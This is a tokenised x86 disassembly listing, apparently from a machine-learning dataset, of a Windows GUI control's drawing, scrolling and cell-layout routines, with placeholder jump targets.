mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
jne r-xdata
or [ ebp - 0x84 ] 0x8
or [ ebp - 0x88 ] 0x2
mov eax [ edi + 0x8 ]
cmp eax [ edi + 0xc ]
jge r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x10
je r-xdata
mov eax [ edi + 0x38 ]
cmp eax [ edi + 0x3c ]
jge r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x70 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_4221f8
mov eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
mov ecx [ edi + 0xc ]
xor edx edx
mov eax [ edi + 0x8 ]
call sub_416a60
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_4225d0
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
mov eax [ ebx ]
mov si 0xffc8
call sub_403368
test al al
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x70 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_4221f8
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x38 ]
xor eax eax
call sub_416a60
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_4225d0
mov eax [ ebx ]
mov si 0xffb5
call sub_403368
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
mov eax [ ebx ]
call sub_476574
push 0x0
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
call sub_47913c
lea edx [ ebp - 0xc8 ]
lea ecx [ ebp - 0xb8 ]
mov eax [ ebx ]
call sub_476eb0
mov eax [ ebx ]
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
push edi
lea esi [ ebp - 0xb8 ]
lea edi [ ebp - 0xa8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0xb0 ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0xb8 ]
mov [ ebp - 0xa0 ] eax
lea eax [ ebp - 0xa8 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_4229f0
push eax
call DrawFocusRect
lea edx [ ebp - 0xb8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_42259c
jmp r-xdata
sub_475f44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp esi [ ebp - 0x4 ]
jle r-xdata
mov eax [ ebx + 0x1c ]
mov edx [ ebx + 0x20 ]
dec edx
mov [ ebp - 0xc ] esi
xor eax eax
mov edx [ ebx + 0x18 ]
dec edx
xor ecx ecx
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] 0xffffffff
mov esi eax
sub edx esi
jl r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
sub_475fac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f5b4
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov esi [ ebx + 0x1c ]
mov edi [ ebx + 0x20 ]
dec edi
mov [ ebp - 0xc ] eax
xor esi esi
mov edi [ ebx + 0x18 ]
dec edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f5b4
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x8 ] 0xffffffff
sub edi esi
jl r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
sub_47602c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
push ebp
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_475fac
pop ecx
mov [ edi ] eax
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_475f44
mov [ edi ] eax
jmp r-xdata
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0xc ]
call sub_475f44
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_476088
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43f5f8
push eax
mov eax ebx
call sub_43f5b4
mov ecx eax
mov edx esi
mov eax ebx
call sub_47610c
pop esi
pop ebx
retn
sub_4760ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov [ ebx + 0xc ] edx
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x14 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebx + 0x10 ] eax
mov esi [ ebx + 0x1c ]
mov eax [ ebx + 0x20 ]
dec eax
sub eax esi
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
mov [ ebx + 0x10 ] esi
mov eax [ ebx + 0x8 ]
mov [ ebx + 0x14 ] eax
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebx + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov edx eax
add edx [ ebx ]
cmp edx [ ebx + 0x8 ]
jge r-xdata
sub_47610c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx ebx
call sub_4761c8
mov eax ebx
mov edx esi
call sub_4760ac
lea eax [ ebx + 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_4760ac
pop esi
pop ebx
pop ebp
retn 0x4
sub_476138
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x2 ] dx
mov ebx eax
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x248 ]
and ax [ ebp - 0x2 ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x244 ]
mov [ ebx ] eax
xor eax eax
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x28 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
inc esi
xor edi edi
xor eax eax
mov [ ebx + 0x4 ] eax
mov esi [ ebp - 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
add eax [ ebx ]
add [ ebx + 0x4 ] eax
inc edi
dec esi
jne r-xdata
sub_4761c8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push sub_4790fc
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x238 ]
mov eax ebx
mov dx [ r-xdata ]
call sub_476138
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push sub_47911c
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x23c ]
lea eax [ ebx + 0x30 ]
mov dx [ r-xdata ]
call sub_476138
pop ecx
pop ebx
pop ecx
pop ebp
retn
sub_47624c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0xc ]
add eax [ ebx ]
mov [ ebp - 0xc ] eax
mov esi [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
sub eax esi
jg r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec eax
mov [ ebp - 0x10 ] eax
dec esi
inc [ ebp - 0x10 ]
jne r-xdata
sub [ ebp - 0xc ] eax
mov eax [ ebx ]
sub [ ebp - 0xc ] eax
mov eax [ ebx + 0x4 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
test eax eax
jle r-xdata
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
test eax eax
jg r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
sub_4762c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov edx [ ebx ]
mov eax esi
call sub_47624c
mov [ edi ] eax
mov edx [ ebx + 0x4 ]
lea eax [ esi + 0x30 ]
call sub_47624c
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4762f0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ ebp - 0x5 ] 0x3
jne r-xdata
mov ebx [ edi + 0x4 ]
mov eax [ edi ]
mov [ ebp - 0x14 ] eax
xor edx edx
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x14 ] 0x7
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403368
test al al
je r-xdata
mov eax [ edi + 0x1c ]
mov edx [ edi + 0x20 ]
dec edx
sub edx eax
jl r-xdata
mov [ ebp - 0x14 ] 0x7
mov edx [ ebp - 0x14 ]
sub edx eax
shr edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f5b4
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0xc ]
cmp eax [ edi + 0x8 ]
jne r-xdata
inc edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0xc ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx eax
sub edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x4 ]
jg r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
cmp eax [ ebp - 0x4 ]
jl r-xdata
add ebx [ edi ]
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
add eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
mov dl [ ebp - 0x5 ]
mov [ eax ] dl
mov eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x10 ]
mov [ edx ] eax
mov eax [ edi + 0xc ]
sub eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
mov [ edx ] eax
mov eax [ edi + 0x10 ]
inc eax
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ edx ] eax
mov edx [ ebp - 0xc ]
mov eax [ edi + 0x2c ]
call [ edi + 0x28 ]
add ebx eax
cmp ebx [ edi + 0x8 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
mov dl [ ebp - 0x5 ]
mov [ eax ] dl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
mov [ eax ] ebx
sub ebx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov [ eax ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
jmp r-xdata
sub_476408
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f5b4
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
setg al
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
cmp eax [ edx + 0x4 ]
setg al
pop esi
pop ebp
retn
sub_476454
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f5b4
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
setge al
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
cmp eax [ edx + 0x4 ]
setge al
pop esi
pop ebp
retn
sub_4764a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
mov [ eax ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov bx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax ebx
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x290 ]
or ax bx
mov ebx eax
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp - 0x4 ]
call sub_43f5f8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0x4 ]
call sub_43f5b4
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
push ebp
call sub_476408
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp esi [ eax + 0x34 ]
jle r-xdata
test bl 0x80
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
cmp esi [ eax + 0x34 ]
jge r-xdata
push ebp
call sub_476454
pop ecx
test al al
jne r-xdata
push ebp
mov eax [ ebp + 0x8 ]
mov cl 0x3
mov edx [ ebp - 0x8 ]
call sub_4762f0
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp + 0x8 ]
add eax 0x30
mov cl 0x2
mov edx esi
call sub_4762f0
pop ecx
sub_476574
push ebx
add esp 0xfffffff0
mov ebx eax
test dl dl
je r-xdata
mov ecx esp
xor edx edx
xor eax eax
call sub_416a38
lea ecx [ esp + 0x8 ]
mov edx 0x1
mov eax 0x1
call sub_416a38
push 0x8
mov eax [ ebx + 0x208 ]
call sub_4229f0
push eax
call SetMapMode
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_4229f0
push eax
call SetWindowOrgEx
push 0x0
mov eax ebx
call sub_43f5f8
push eax
mov eax ebx
call sub_43f5b4
push eax
mov eax [ ebx + 0x208 ]
call sub_4229f0
push eax
call SetViewportExtEx
push 0x0
mov eax ebx
call sub_43f5f8
imul [ esp + 0x10 ]
push eax
mov eax ebx
call sub_43f5b4
imul [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_4229f0
push eax
call SetWindowExtEx
mov eax ebx
call sub_43f5b4
mov ecx esp
xor edx edx
call sub_416a38
lea ecx [ esp + 0x8 ]
mov edx 0x1
or eax 0xffffffff
call sub_416a38
push 0x8
mov eax [ ebx + 0x208 ]
call sub_4229f0
push eax
call SetMapMode
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_4229f0
push eax
call SetWindowOrgEx
push 0x0
mov eax ebx
call sub_43f5f8
push eax
mov eax ebx
call sub_43f5b4
push eax
mov eax [ ebx + 0x208 ]
call sub_4229f0
push eax
call SetViewportExtEx
push 0x0
mov eax ebx
call sub_43f5f8
imul [ esp + 0x10 ]
push eax
mov eax ebx
call sub_43f5b4
imul [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_4229f0
push eax
call SetWindowExtEx
jmp r-xdata
add esp 0x10
pop ebx
retn
sub_4766c8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
mov eax [ eax + 0x10 ]
call sub_428c40
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
and ecx ebx
mov edx esi
not edx
and edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_474e98
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0xc ] eax
push 0x0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446450
push eax
call InvalidateRect
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476734
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x224 ] 0x0
je r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x230 ]
mov eax [ ebx ]
mov edx [ eax + 0x21c ]
mov eax [ ebx ]
add eax 0x220
call sub_473f9c
mov eax [ ebx ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x21c ]
mov eax [ ebx ]
add eax 0x224
mov ecx 0x1
call sub_473f9c
mov eax [ ebx ]
mov edx [ eax + 0x228 ]
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x22c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x24c ]
mov edx [ ebx ]
cmp eax [ edx + 0x22c ]
jg r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x234 ]
mov eax [ ebx ]
mov edx [ eax + 0x24c ]
mov eax [ ebx ]
add eax 0x250
call sub_473f9c
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
mov edx [ ebx ]
cmp eax [ edx + 0x228 ]
jg r-xdata
dec eax
mov [ ebp - 0x4 ] eax
mov edx [ ebx ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x8 ]
cmp edx eax
jne r-xdata
dec eax
mov [ ebp - 0x8 ] eax
push 0x1
push 0x1
mov edx [ ebx ]
mov ecx [ ebp - 0x4 ]
xchg edx eax
call sub_4776f4
mov edx [ ebx ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0x4 ]
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_47766c
mov eax [ ebx ]
mov eax [ eax + 0x214 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x210 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebx ]
call sub_477024
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4c ]
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x292 ] 0x0
jne r-xdata
mov eax [ ebx ]
call sub_478034
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x6c ]
mov eax [ ebx ]
mov si 0xffa8
call sub_403368
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ ebx ]
call sub_446754
test al al
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx ]
call sub_476088
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x68 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff98
xor ecx ecx
call sub_4766c8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffc8
or ecx 0xffffffff
call sub_4766c8
pop ecx
sub_4768dc
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_446754
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x21c ] ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] esi
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x238 ]
jge r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_476088
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x23c ]
jge r-xdata
dec ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x238 ] ebx
xor eax eax
push ebp
push sub_476976
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_476734
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4769b4
push ebx
push esi
add esp 0xffffff90
mov esi edx
mov ebx eax
mov eax ebx
call sub_446754
test al al
je r-xdata
add esp 0x70
pop esi
pop ebx
retn
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_476088
mov eax [ esi ]
cmp eax [ esp + 0x20 ]
jg r-xdata
mov eax [ ebx + 0x258 ]
mov [ esp + 0x8 ] eax
mov eax [ ebx + 0x25c ]
mov [ esp + 0xc ] eax
push esp
lea ecx [ esp + 0x14 ]
mov edx esi
mov eax ebx
call sub_4762c0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ esi ]
cmp eax [ ebx + 0x258 ]
jge r-xdata
mov edx [ esi + 0x4 ]
cmp edx [ esp + 0x50 ]
jg r-xdata
cmp eax [ esp + 0x20 ]
jle r-xdata
mov [ ebx + 0x258 ] eax
jmp r-xdata
cmp eax [ ebx + 0x258 ]
jl r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x25c ]
jge r-xdata
mov eax [ esp ]
mov [ ebx + 0x258 ] eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x25c ]
jge r-xdata
cmp eax [ esp + 0x50 ]
jle r-xdata
mov [ ebx + 0x25c ] eax
jmp r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_477b88
mov eax [ esp + 0x4 ]
mov [ ebx + 0x25c ] eax
sub_476a7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421d64
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_476bae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov dl 0x2
call sub_421ff4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov dl 0xe
call sub_421fd8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_422024
xor eax eax
push ebp
push sub_476b91
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x28e ] 0x2
jne r-xdata
mov edx [ ebx + 0x264 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_42266c
mov ecx [ edi + 0x38 ]
mov edx [ ebx + 0x264 ]
mov eax [ ebp - 0x8 ]
call sub_42260c
mov eax ebx
mov si 0xffc8
call sub_403368
test al al
je r-xdata
mov ecx [ ebx + 0x264 ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42266c
mov ecx [ ebx + 0x264 ]
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_42260c
jmp r-xdata
mov ecx [ ebx + 0x264 ]
mov edx [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42266c
mov edx [ edi + 0xc ]
sub edx [ edi + 0x8 ]
mov ecx [ ebx + 0x264 ]
mov eax [ ebp - 0x8 ]
call sub_42260c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476b98
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4228fc
retn
sub_476bbc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421d64
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_476d3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
push ebp
push sub_476d20
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov dl 0x2
call sub_421ff4
mov eax [ ebx + 0x10 ]
mov dl 0xe
call sub_421fd8
mov eax [ ebx + 0x10 ]
mov edx 0x5
call sub_422024
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x4
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_474e98
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x26c ]
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_474e98
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x26c ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
mov esi [ ebp - 0x14 ]
mov esi [ ebp - 0xc ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
jmp r-xdata
mov esi [ ebp - 0x18 ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476d27
mov eax [ ebp - 0x4 ]
